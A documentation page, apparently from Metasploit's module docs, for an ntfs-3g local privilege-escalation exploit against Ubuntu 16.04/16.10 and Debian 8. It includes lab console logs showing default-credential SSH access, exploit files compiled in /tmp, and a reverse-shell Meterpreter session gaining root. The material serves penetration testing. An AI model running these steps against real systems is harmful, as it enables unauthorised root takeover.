{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/local/ntfs3g_priv_esc","result":{"data":{"moduleMetadataJson":{"id":"121fac44-a407-56d1-978b-917093461f97","name":"Debian/Ubuntu ntfs-3g Local Privilege Escalation","fullname":"exploit/linux/local/ntfs3g_priv_esc","description":"ntfs-3g mount helper in Ubuntu 16.04, 16.10, Debian 7, 8, and possibly 9 does not properly sanitize the environment when executing modprobe.\n          This can be abused to load a kernel module and execute a binary payload as the root user.","rank":400,"fields":{"detailsSlug":"/modules/details/exploit/linux/local/ntfs3g_priv_esc","documentationSlug":"/modules/documentation/exploit/linux/local/ntfs3g_priv_esc","referencesSlug":"/modules/references/exploit/linux/local/ntfs3g_priv_esc"},"documentation":{"html":"<h2 id=\"creating-a-testing-environment\" style=\"position:relative;\"><a href=\"#creating-a-testing-environment\" aria-label=\"creating a testing environment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Creating A Testing Environment</h2>\n<p>  We have to live compile on the host, so <code class=\"language-text\">make</code> and <code class=\"language-text\">gcc</code> are required.  Easiest thing to do is: <code class=\"language-text\">apt-get install build-essential</code>.</p>\n<p>  As per notes from the original EDB module, if you're in a VM, you should use <strong>at least two CPU cores</strong>.  This was confirmed during testing of this module as well.</p>\n<p>This module has been tested against:</p>\n<ol>\n<li>Ubuntu 16.04 with ntfs-3g 1:2015.3.14AR.1-1build1</li>\n<li>Ubuntu 16.10 with ntfs-3g 1:2016.2.22AR.1-3</li>\n<li>Debian Jessie 8 (8.7.1, had to downgrade ntfs-3g to vuln version, and install kernel headers): <code class=\"language-text\">apt-get install ntfs-3g=1:2014.2.15AR.2-1+deb8u2 linux-headers-$(uname -r)</code></li>\n</ol>\n<p>This module was not tested against, but may work against:</p>\n<ol>\n<li>Debian 7</li>\n<li>Debian 9</li>\n<li>Other Debian based systems</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Exploit a box via whatever method</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/local/ntfs3_priv_esc</code></li>\n<li>Do: <code class=\"language-text\">set session #</code></li>\n<li>Do: <code class=\"language-text\">set verbose true</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>WritableDir</strong></p>\n<p>  A folder we can write files to.  Defaults to /tmp</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ubuntu-1604-ntfs-3g-12015314ar1-1build1\" style=\"position:relative;\"><a href=\"#ubuntu-1604-ntfs-3g-12015314ar1-1build1\" aria-label=\"ubuntu 1604 ntfs 3g 12015314ar1 1build1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubuntu 16.04 (ntfs-3g 1:2015.3.14AR.1-1build1)</h3>\n<h4 id=\"initial-access\" style=\"position:relative;\"><a href=\"#initial-access\" aria-label=\"initial access permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Initial Access</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (ntfs3g.rc)&gt; use auxiliary/scanner/ssh/ssh_login\nresource (ntfs3g.rc)&gt; set rhosts 192.168.2.137\nrhosts =&gt; 192.168.2.137\nresource (ntfs3g.rc)&gt; set username ubuntu\nusername =&gt; ubuntu\nresource (ntfs3g.rc)&gt; set password ubuntu\npassword =&gt; ubuntu\nresource (ntfs3g.rc)&gt; exploit\n[*] SSH - Starting bruteforce\n[+] SSH - Success: &#39;ubuntu:ubuntu&#39; &#39;uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux &#39;\n[!] No active DB -- Credential data will not be saved!\n[*] Command shell session 1 opened (192.168.2.117:40371 -&gt; 192.168.2.137:22) at 2017-02-24 21:33:59 -0500\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"escalate\" style=\"position:relative;\"><a href=\"#escalate\" aria-label=\"escalate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Escalate</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (ntfs3g.rc)&gt; use exploit/linux/local/ntfs3g_priv_esc\nresource (ntfs3g.rc)&gt; set verbose true\nverbose =&gt; true\nresource (ntfs3g.rc)&gt; set session 1\nsession =&gt; 1\nresource (ntfs3g.rc)&gt; set target 1\ntarget =&gt; 1\nresource (ntfs3g.rc)&gt; set lhost 192.168.2.117\nlhost =&gt; 192.168.2.117\nresource (ntfs3g.rc)&gt; check\n[!] SESSION may not be compatible with this module.\n[+] Vulnerable Ubuntu 16.04 detected\n[*]  The target appears to be vulnerable.\nresource (ntfs3g.rc)&gt; exploit\n[!] SESSION may not be compatible with this module.\n[*] Started reverse TCP handler on 192.168.2.117:4444 \n[+] Vulnerable Ubuntu 16.04 detected\n[+] make is installed\n[+] gcc is installed\n[*] Live compiling exploit on system\n[*] Writing files to target\n[*] Writing rootshell to /tmp/rootshell.c\n[*] Max line length is 65537\n[*] Writing 345 bytes in 1 chunks of 1198 bytes (octal-encoded), using printf\n[*] Writing sploit to /tmp/sploit.c\n[*] Max line length is 65537\n[*] Writing 7632 bytes in 1 chunks of 26966 bytes (octal-encoded), using printf\n[*] Writing rootmod to /tmp/rootmod.c\n[*] Max line length is 65537\n[*] Writing 1115 bytes in 1 chunks of 4016 bytes (octal-encoded), using printf\n[*] Writing Makefile to /tmp/Makefile\n[*] Max line length is 65537\n[*] Writing 18 bytes in 1 chunks of 66 bytes (octal-encoded), using printf\n[*] Writing payload to /tmp/KggJEFqa\n[*] Max line length is 65537\n[*] Writing 206 bytes in 1 chunks of 567 bytes (octal-encoded), using printf\n[*] Starting execution of priv esc.\n[*] Transmitting intermediate stager...(126 bytes)\n[*] Sending stage (2440248 bytes) to 192.168.2.137\n[*] Meterpreter session 2 opened (192.168.2.117:4444 -&gt; 192.168.2.137:53144) at 2017-02-24 21:34:25 -0500\n[!] This exploit may require manual cleanup of &#39;/tmp/rootshell.c&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/tmp/rootshell&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/tmp/sploit.c&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/tmp/sploit&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/tmp/rootmod.c&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/tmp/Makefile&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/tmp/KggJEFqa&#39; on the target\n    \nmeterpreter &gt; sysinfo\nComputer     : 192.168.2.137\nOS           : Ubuntu 16.04 (Linux 4.4.0-21-generic)\nArchitecture : x64\nMeterpreter  : x64/linux\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"ubuntu-1610-ntfs-3g-12016222ar1-3\" style=\"position:relative;\"><a href=\"#ubuntu-1610-ntfs-3g-12016222ar1-3\" aria-label=\"ubuntu 1610 ntfs 3g 12016222ar1 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubuntu 16.10 (ntfs-3g 1:2016.2.22AR.1-3)</h3>\n<h4 id=\"initial-access-1\" style=\"position:relative;\"><a href=\"#initial-access-1\" aria-label=\"initial access 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Initial Access</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Processing ntfs3g.rc for ERB directives.\nresource (ntfs3g.rc)&gt; use auxiliary/scanner/ssh/ssh_login\nresource (ntfs3g.rc)&gt; set rhosts 192.168.2.197\nrhosts =&gt; 192.168.2.197\nresource (ntfs3g.rc)&gt; set username ubuntu\nusername =&gt; ubuntu\nresource (ntfs3g.rc)&gt; set password ubuntu\npassword =&gt; ubuntu\nresource (ntfs3g.rc)&gt; exploit\n[*] SSH - Starting bruteforce\n[+] SSH - Success: &#39;ubuntu:ubuntu&#39; &#39;uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lxd),115(lpadmin),116(sambashare) Linux ubuntu1610 4.8.0-22-generic #24-Ubuntu SMP Sat Oct 8 09:15:00 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux &#39;\n[!] No active DB -- Credential data will not be saved!\n[*] Command shell session 1 opened (192.168.2.117:37241 -&gt; 192.168.2.197:22) at 2017-02-25 21:48:06 -0500\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"escalate-1\" style=\"position:relative;\"><a href=\"#escalate-1\" aria-label=\"escalate 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Escalate</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (ntfs3g.rc)&gt; use exploit/linux/local/ntfs3g_priv_esc\nresource (ntfs3g.rc)&gt; set verbose true\nverbose =&gt; true\nresource (ntfs3g.rc)&gt; set session 1\nsession =&gt; 1\nresource (ntfs3g.rc)&gt; set target 1\ntarget =&gt; 1\nresource (ntfs3g.rc)&gt; set lhost 192.168.2.117\nlhost =&gt; 192.168.2.117\nresource (ntfs3g.rc)&gt; check\n[!] SESSION may not be compatible with this module.\n[+] Vulnerable Ubuntu 16.10 detected\n[*]  The target appears to be vulnerable.\nresource (ntfs3g.rc)&gt; exploit\n[!] SESSION may not be compatible with this module.\n[*] Started reverse TCP handler on 192.168.2.117:4444 \n[+] Vulnerable Ubuntu 16.10 detected\n[+] make is installed\n[+] gcc is installed\n[*] Live compiling exploit on system\n[*] Writing files to target\n[*] Writing rootshell to /tmp/rootshell.c\n[*] Max line length is 65537\n[*] Writing 345 bytes in 1 chunks of 1198 bytes (octal-encoded), using printf\n[*] Writing sploit to /tmp/sploit.c\n[*] Max line length is 65537\n[*] Writing 7632 bytes in 1 chunks of 26966 bytes (octal-encoded), using printf\n[*] Writing rootmod to /tmp/rootmod.c\n[*] Max line length is 65537\n[*] Writing 1115 bytes in 1 chunks of 4016 bytes (octal-encoded), using printf\n[*] Writing Makefile to /tmp/Makefile\n[*] Max line length is 65537\n[*] Writing 18 bytes in 1 chunks of 66 bytes (octal-encoded), using printf\n[*] Writing payload to /tmp/ECldPeni\n[*] Max line length is 65537\n[*] Writing 206 bytes in 1 chunks of 567 bytes (octal-encoded), using printf\n[*] Starting execution of priv esc.\n[*] Transmitting intermediate stager...(126 bytes)\n[*] Sending stage (2440248 bytes) to 192.168.2.197\n[*] Meterpreter session 2 opened (192.168.2.117:4444 -&gt; 192.168.2.197:40746) at 2017-02-25 21:48:39 -0500\n[!] This exploit may require manual cleanup of &#39;/tmp/rootshell.c&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/tmp/rootshell&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/tmp/sploit.c&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/tmp/sploit&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/tmp/rootmod.c&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/tmp/Makefile&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/tmp/ECldPeni&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/tmp/rootmod.ko&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/tmp/rootmod.mod.c&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/tmp/rootmod.mod.o&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/tmp/rootmod.o&#39; on the target\n\nmeterpreter &gt; sysinfo\nComputer     : 192.168.2.197\nOS           : Ubuntu 16.10 (Linux 4.8.0-22-generic)\nArchitecture : x64\nMeterpreter  : x64/linux\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"debian-871-ntfs-3g-12014215ar2-1deb8u2\" style=\"position:relative;\"><a href=\"#debian-871-ntfs-3g-12014215ar2-1deb8u2\" aria-label=\"debian 871 ntfs 3g 12014215ar2 1deb8u2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Debian 8.7.1 (ntfs-3g 1:2014.2.15AR.2-1+deb8u2)</h3>\n<h4 id=\"initial-access-2\" style=\"position:relative;\"><a href=\"#initial-access-2\" aria-label=\"initial access 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Initial Access</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Processing ntfs3g.rc for ERB directives.\nresource (ntfs3g.rc)&gt; use auxiliary/scanner/ssh/ssh_login\nresource (ntfs3g.rc)&gt; set rhosts 192.168.2.83\nrhosts =&gt; 192.168.2.83\nresource (ntfs3g.rc)&gt; set username debian\nusername =&gt; debian\nresource (ntfs3g.rc)&gt; set password debian\npassword =&gt; debian\nresource (ntfs3g.rc)&gt; exploit\n[*] SSH - Starting bruteforce\n[+] SSH - Success: &#39;debian:debian&#39; &#39;uid=1000(debian) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(scanner),115(bluetooth) Linux debian871 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1+deb8u1 (2017-02-22) x86_64 GNU/Linux &#39;\n[!] No active DB -- Credential data will not be saved!\n[*] Command shell session 1 opened (192.168.2.117:40679 -&gt; 192.168.2.83:22) at 2017-02-25 22:17:49 -0500\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"escalate-2\" style=\"position:relative;\"><a href=\"#escalate-2\" aria-label=\"escalate 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Escalate</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (ntfs3g.rc)&gt; use exploit/linux/local/ntfs3g_priv_esc\nresource (ntfs3g.rc)&gt; set verbose true\nverbose =&gt; true\nresource (ntfs3g.rc)&gt; set session 1\nsession =&gt; 1\nresource (ntfs3g.rc)&gt; set target 1\ntarget =&gt; 1\nresource (ntfs3g.rc)&gt; set lhost 192.168.2.117\nlhost =&gt; 192.168.2.117\nresource (ntfs3g.rc)&gt; check\n[!] SESSION may not be compatible with this module.\n[+] Vulnerable Debian 8 (jessie) detected\n[*]  The target appears to be vulnerable.\nresource (ntfs3g.rc)&gt; exploit\n[!] SESSION may not be compatible with this module.\n[*] Started reverse TCP handler on 192.168.2.117:4444 \n[+] Vulnerable Debian 8 (jessie) detected\n[+] make is installed\n[+] gcc is installed\n[*] Live compiling exploit on system\n[*] Writing files to target\n[*] Writing rootshell to /tmp/rootshell.c\n[*] Max line length is 65537\n[*] Writing 345 bytes in 1 chunks of 1198 bytes (octal-encoded), using printf\n[*] Writing sploit to /tmp/sploit.c\n[*] Max line length is 65537\n[*] Writing 7632 bytes in 1 chunks of 26966 bytes (octal-encoded), using printf\n[*] Writing rootmod to /tmp/rootmod.c\n[*] Max line length is 65537\n[*] Writing 1115 bytes in 1 chunks of 4016 bytes (octal-encoded), using printf\n[*] Writing Makefile to /tmp/Makefile\n[*] Max line length is 65537\n[*] Writing 18 bytes in 1 chunks of 66 bytes (octal-encoded), using printf\n[*] Writing payload to /tmp/cCacqozW\n[*] Max line length is 65537\n[*] Writing 206 bytes in 1 chunks of 567 bytes (octal-encoded), using printf\n[*] Starting execution of priv esc.\n[*] Transmitting intermediate stager...(126 bytes)\n[*] Sending stage (2440248 bytes) to 192.168.2.83\n[*] Meterpreter session 2 opened (192.168.2.117:4444 -&gt; 192.168.2.83:48762) at 2017-02-25 22:18:27 -0500\n\nmeterpreter &gt; sysinfo\nComputer     : 192.168.2.83\nOS           : Debian 8.7 (Linux 3.16.0-4-amd64)\nArchitecture : x64\nMeterpreter  : x64/linux\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"121fac44-a407-56d1-978b-917093461f97"}}}